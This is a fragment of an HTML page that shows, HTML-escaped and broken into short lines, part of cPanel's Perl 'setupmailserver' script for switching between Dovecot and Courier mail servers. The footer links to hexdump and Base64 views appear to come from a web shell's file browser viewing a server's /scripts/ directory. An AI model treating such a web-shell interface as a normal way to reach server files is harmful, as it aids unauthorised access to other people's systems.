{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nWARNING:&nbsp;Some&nbsp;<br>errors&nbsp;encountered&nbsp;durin<br>g&nbsp;the&nbsp;conversion&nbsp;process<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;1;&nbsp;}&nbsp;else&nbsp;<br>{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nMailserve<br>r&nbsp;conversion&nbsp;complete\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;sub&nbsp;run<br>_fastmail&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system&nbsp;'<br>/scripts/fastmail';&nbsp;}&nbsp;&nbsp;s<br>ub&nbsp;disable_none&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;un<br>link&nbsp;'/etc/imapdisable'&nbsp;<br>&nbsp;&nbsp;if&nbsp;(&nbsp;-e&nbsp;'/etc/imapdisa<br>ble'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink&nbsp;'/etc<br>/cpimapdisable'&nbsp;if&nbsp;(&nbsp;-e&nbsp;<br>'/etc/cpimapdisable'&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;unlink&nbsp;'/etc/imapddi<br>sable'&nbsp;&nbsp;if&nbsp;(&nbsp;-e&nbsp;'/etc/im<br>apddisable'&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;di<br>sable_dovecot&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prin<br>t&nbsp;&quot;\\nHalting&nbsp;Dovecot\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$init-<br>&gt;run_command(&nbsp;'dovecot',<br>&nbsp;'stop'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n<br>Disabling&nbsp;Dovecot&nbsp;in&nbsp;ini<br>t&nbsp;system\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output<br>&nbsp;=&nbsp;$init-&gt;run_command_fo<br>r_one(&nbsp;'disable',&nbsp;'dovec<br>ot'&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;disable_co<br>urier&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nHal<br>ting&nbsp;Courier\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>@services&nbsp;=&nbsp;qw(courier-i<br>map&nbsp;courier-authlib);&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;if&nbsp;(&nbsp;$distro&nbsp;eq&nbsp;'freeb<br>sd'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@service<br>s&nbsp;=&nbsp;qw(courier-imap-pop3<br>d&nbsp;courier-imap-pop3d-ssl<br>&nbsp;courier-imap-imapd&nbsp;cour<br>ier-imap-imapd-ssl&nbsp;couri<br>er-authdaemond);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;foreach&nbsp;my&nbsp;$service&nbsp;(<br>@services)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>$output&nbsp;=&nbsp;$init-&gt;run_com<br>mand(&nbsp;$service,&nbsp;'stop'&nbsp;)<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nDis<br>abling&nbsp;Courier&nbsp;in&nbsp;init&nbsp;s<br>ystem\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;my<br>&nbsp;$service&nbsp;(@services)&nbsp;{&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$in<br>it-&gt;run_command_for_one(<br>&nbsp;'disable',&nbsp;$service&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;#&nbsp;Strictly&nbsp;spea<br>king,&nbsp;touching&nbsp;/etc/imap<br>disable&nbsp;will&nbsp;cause&nbsp;chksr<br>vd&nbsp;to&nbsp;skip&nbsp;over&nbsp;#&nbsp;restar<br>ting&nbsp;Dovecot&nbsp;or&nbsp;Courier,<br>&nbsp;but&nbsp;this&nbsp;will&nbsp;stop&nbsp;it&nbsp;f<br>rom&nbsp;even&nbsp;polling&nbsp;for&nbsp;the<br>se&nbsp;processes&nbsp;sub&nbsp;disable<br>_chksrvd_monitoring&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;%monitored_services<br>&nbsp;=&nbsp;Cpanel::Chkservd::get<br>monitored();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!$<br>monitored_services{'imap<br>'}&nbsp;&amp;&amp;&nbsp;!$monitored_servic<br>es{'pop'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nChksrvd&nbsp;monitorin<br>g&nbsp;is&nbsp;disabled\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;\\nDisabling&nbsp;Chksrvd&nbsp;mo<br>nitoring\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpa<br>nel::Chkservd::disable('<br>imap');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::<br>Chkservd::disable('pop')<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scrip<br>ts/restartsrv_chksrvd');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;sub&nbsp;enable_non<br>e&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(&nbsp;'touch',<br>&nbsp;'/etc/imapdisable'&nbsp;);&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nDisabling&nbsp;ma<br>il&nbsp;server&nbsp;updates\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;$updateconf&nbsp;=&nbsp;Cpane<br>l::Update::loadupdatecon<br>fig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;<br>{'COURIERUP'}&nbsp;=&nbsp;'never';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'DOVE<br>COTUP'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C<br>panel::Update::saveupdat<br>econfig($updateconf);&nbsp;}&nbsp;<br>&nbsp;sub&nbsp;enable_dovecot&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;print&nbsp;&quot;\\nChecking&nbsp;that<br>&nbsp;Dovecot&nbsp;is&nbsp;up&nbsp;to&nbsp;date\\n<br>&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$updateconf&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::Update::loa<br>dupdateconfig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>%orig_updateconf&nbsp;=&nbsp;%{$up<br>dateconf};&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateco<br>nf-&gt;{'COURIERUP'}&nbsp;=&nbsp;'nev<br>er';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'<br>DOVECOTUP'}&nbsp;=&nbsp;'daily';&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'SYSUP'<br>}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;'daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpa<br>nel::Update::saveupdatec<br>onfig($updateconf);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>my&nbsp;@dovecotup&nbsp;=&nbsp;('/scrip<br>ts/dovecotup');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push<br>&nbsp;@dovecotup,&nbsp;'--force'&nbsp;i<br>f&nbsp;($force);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(@<br>dovecotup);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;<br>(&nbsp;$skip_maildir_conversi<br>on&nbsp;||&nbsp;(&nbsp;!$force&nbsp;&amp;&amp;&nbsp;$last<br>_active_mailserver&nbsp;eq&nbsp;'d<br>ovecot'&nbsp;)&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nConverting&nbsp;user&nbsp;m<br>aildirs&nbsp;to&nbsp;Dovecot&nbsp;forma<br>t...\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(<br>'/scripts/maildir_conver<br>ter&nbsp;--forreal&nbsp;--overwrit<br>e&nbsp;--to-dovecot');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;$error_count++&nbsp;if&nbsp;($?)<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nCh<br>ecking&nbsp;SSL&nbsp;cert...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;my&nbsp;$dovecot_cert_ref&nbsp;=&nbsp;<br>Cpanel::SSLCerts::fetchS<br>SLFiles(&nbsp;'service'&nbsp;=&gt;&nbsp;'d<br>ovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;(&nbsp;<br>$dovecot_cert_ref-&gt;{'crt<br>'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;mi<br>ssing\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Generating&nbsp;default&nbsp;cert<br>...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;OLDST<br>DERR,&nbsp;'&gt;&amp;STDERR';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;open&nbsp;STDERR,&nbsp;'&gt;',&nbsp;'/de<br>v/null';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel:<br>:SSLCerts::createDefault<br>SSLFiles(&nbsp;'service'&nbsp;=&gt;&nbsp;'<br>dovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;open<br>&nbsp;STDERR,&nbsp;'&gt;&amp;OLDSTDERR';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;done\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$courier_cert<br>_ref&nbsp;=&nbsp;Cpanel::SSLCerts:<br>:fetchSSLFiles(&nbsp;'service<br>'&nbsp;=&gt;&nbsp;'courier-imapd'&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$courier_c<br>ert_ref-&gt;{'crt'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Reusing&nbsp;<br>existing&nbsp;Courier-IMAP&nbsp;ce<br>rt...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cou<br>rier_cert_ref-&gt;{'service<br>'}&nbsp;=&nbsp;'dovecot';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;$courier_cert_ref-&gt;{<br>'quiet'}&nbsp;&nbsp;&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;@result&nbsp;=&nbsp;Cpanel:<br>:SSLCerts::installSSLFil<br>es(&nbsp;%{$courier_cert_ref}<br>&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;d<br>one\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;done\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nChecking&nbsp;for&nbsp;expi<br>red&nbsp;SSL&nbsp;certs...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s<br>ystem&nbsp;'/usr/local/cpanel<br>/bin/checkallsslcerts';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;done\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;Dovec<br>ot&nbsp;in&nbsp;init&nbsp;system\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$init-&gt;ru<br>n_command_for_one(&nbsp;'enab<br>le',&nbsp;'dovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nStarting&nbsp;Dovecot\\<br>n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;$init-<br>&gt;run_command(&nbsp;'dovecot',<br>&nbsp;'start'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\<br>nEnabling&nbsp;Dovecot&nbsp;update<br>s\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateco<br>nf{'DOVECOTUP'}&nbsp;=&nbsp;'inher<br>it';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updatecon<br>f{'COURIERUP'}&nbsp;=&nbsp;'never'<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::Update::sa<br>veupdateconfig(&nbsp;\\%orig_u<br>pdateconf&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;enab<br>le_courier&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nChecking&nbsp;that&nbsp;Courier&nbsp;<br>is&nbsp;up&nbsp;to&nbsp;date\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my<br>&nbsp;$updateconf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpan<br>el::Update::loadupdateco<br>nfig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;%orig_upd<br>ateconf&nbsp;=&nbsp;%{$updateconf}<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'COU<br>RIERUP'}&nbsp;=&nbsp;'daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>$updateconf-&gt;{'DOVECOTUP<br>'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updat<br>econf-&gt;{'SYSUP'}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;'<br>daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::Upda<br>te::saveupdateconfig($up<br>dateconf);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;@couri<br>erup&nbsp;=&nbsp;('/scripts/courie<br>rup');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;@courier<br>up,&nbsp;'--force'&nbsp;if&nbsp;($force<br>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(@courierup<br>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;(&nbsp;$skip_m<br>aildir_conversion&nbsp;||&nbsp;(&nbsp;!<br>$force&nbsp;&amp;&amp;&nbsp;$last_active_m<br>ailserver&nbsp;eq&nbsp;'courier'&nbsp;)<br>&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nCo<br>nverting&nbsp;user&nbsp;maildirs&nbsp;t<br>o&nbsp;Courier&nbsp;format...\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scripts<br>/maildir_converter&nbsp;--for<br>real&nbsp;--overwrite&nbsp;--to-co<br>urier');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error_<br>count++&nbsp;if&nbsp;($?);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$distro&nbsp;eq&nbsp;'free<br>bsd'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nEnabling&nbsp;courier-authd<br>aemond&nbsp;in&nbsp;init&nbsp;system\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$<br>init-&gt;run_command_for_on<br>e(&nbsp;'enable',&nbsp;'courier-au<br>thdaemond'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>&nbsp;Rebuilding&nbsp;the&nbsp;config&nbsp;f<br>ile&nbsp;on&nbsp;FreeBSD&nbsp;will&nbsp;upda<br>te&nbsp;the&nbsp;rc.conf&nbsp;settings&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nReconfi<br>guring&nbsp;other&nbsp;Courier&nbsp;ser<br>vices\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system<br>(&nbsp;'/scripts/courierup',&nbsp;<br>'--reconfig'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nRestarting&nbsp;Cou<br>rier\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(<br>'/scripts/restartsrv_ima<br>p');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;my&nbsp;$servic<br>e&nbsp;(qw(courier-authlib&nbsp;&nbsp;c<br>ourier-imap))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;$s<br>ervice&nbsp;in&nbsp;init&nbsp;system\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output<br>&nbsp;=&nbsp;$init-&gt;run_command_fo<br>r_one(&nbsp;'enable',&nbsp;$servic<br>e&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nStarting&nbsp;$service\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;$i<br>nit-&gt;run_command(&nbsp;$servi<br>ce,&nbsp;'start'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nEnab<br>ling&nbsp;Courier&nbsp;updates\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateconf{'C<br>OURIERUP'}&nbsp;=&nbsp;'inherit';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateconf{'DO<br>VECOTUP'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;Cpanel::Update::saveupd<br>ateconfig($updateconf);&nbsp;<br>}&nbsp;&nbsp;#&nbsp;Both&nbsp;Dovecot&nbsp;and&nbsp;Co<br>urier&nbsp;are&nbsp;monitored&nbsp;by&nbsp;c<br>hksrvd&nbsp;using&nbsp;restartsrv_<br>imap&nbsp;sub&nbsp;enable_chksrvd_<br>monitoring&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;%mon<br>itored_services&nbsp;=&nbsp;Cpanel<br>::Chkservd::getmonitored<br>();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$monitored_<br>services{'imap'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nChksrvd&nbsp;mo<br>nitoring&nbsp;is&nbsp;enabled\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;chksr<br>vd&nbsp;monitoring\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;Cpanel::Chkservd::enab<br>le('imap');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syst<br>em('/scripts/restartsrv_<br>chksrvd');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;sub&nbsp;<br>reconfigure_exim&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p<br>rint&nbsp;&quot;\\nReconfiguring&nbsp;EX<br>IM&nbsp;for&nbsp;new&nbsp;mailserver\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;Cpane<br>l::SafeRun::Errors::safe<br>runallerrors('/scripts/b<br>uildeximconf');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(<br>$?)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error_cou<br>nt++;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;$out<br>put;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nWA<br>RNING:&nbsp;EXIM&nbsp;will&nbsp;not&nbsp;be&nbsp;<br>restarted!\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\<br>nRestarting&nbsp;EXIM\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scripts/re<br>startsrv_exim');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}<br>&nbsp;&nbsp;sub&nbsp;usage&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Usage:&nbsp;setupmailserver&nbsp;<br>[options]&nbsp;&lt;mailserver&gt;\\n<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Options:<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--forc<br>e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Per<br>form&nbsp;conversion&nbsp;even&nbsp;if&nbsp;<br>server&nbsp;is&nbsp;already&nbsp;config<br>ured\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--<br>current&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;Display&nbsp;the&nbsp;currently&nbsp;c<br>onfigured&nbsp;mail&nbsp;server\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--skip-ma<br>ildir-conversion&nbsp;&nbsp;Don't&nbsp;<br>convert&nbsp;user&nbsp;maildirs&nbsp;du<br>ring&nbsp;the&nbsp;server&nbsp;conversi<br>on\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n&quot;;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;print&nbsp;&quot;MailServers:\\n<br>&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;courier&nbsp;<br>&nbsp;&nbsp;&nbsp;Standard&nbsp;mail&nbsp;server&nbsp;<br>on&nbsp;cPanel&nbsp;systems\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;dovecot&nbsp;&nbsp;&nbsp;&nbsp;Lo<br>wer&nbsp;memory&nbsp;usage&nbsp;mail&nbsp;se<br>rver\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;di<br>sabled&nbsp;&nbsp;&nbsp;Disable&nbsp;local&nbsp;P<br>OP3&nbsp;and&nbsp;IMAP&nbsp;functionali<br>ty\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n&quot;;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;</td></tr></table><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=setupmailserver&ft=info&fullhexdump=1&d=%2Fscripts%2F\">Full</a>] [<a href=\"?act=f&f=setupmailserver&ft=info&d=%2Fscripts%2F\">Preview</a>]<br><b>Base64: </b>",
            "<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=1&d=%2Fscripts%2F\">Encode</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=2&d=%2Fscripts%2F\">+chunk</a>]&nbsp;</nobr>",
